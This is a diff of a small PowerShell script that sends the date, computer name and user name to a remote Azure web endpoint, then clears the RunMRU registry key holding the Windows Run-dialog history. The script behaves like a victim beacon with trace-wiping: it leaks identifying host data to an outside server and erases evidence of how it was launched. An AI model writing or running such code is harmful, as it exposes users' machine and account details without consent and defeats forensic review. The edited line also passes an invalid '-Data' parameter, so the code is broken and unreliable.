@@ -1,15 +1,11 @@
 try {
     $data = [PSCustomObject]@{
-        Date     = Get-Date
-        Computer = $env:COMPUTERNAME
-        User     = $env:USERNAME
+         Date     = Get-Date -Format "dddd MM/dd/yyyy HH:mm:fffffff K"
+         Computer = $env:COMPUTERNAME
+         User     = $env:USERNAME
     }
 
-    $body = [PSCustomObject]@{
-        Name = $data
-    }
-
-    Invoke-WebRequest -Method Post -Uri "http://pjx.azurewebsites.net/api/pjx" -Body ($body | ConvertTo-Json)
+    Invoke-WebRequest -Method Post -Uri "https://pjx.azurewebsites.net/api/pjx" -Data $Data
     Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
 }
 catch {
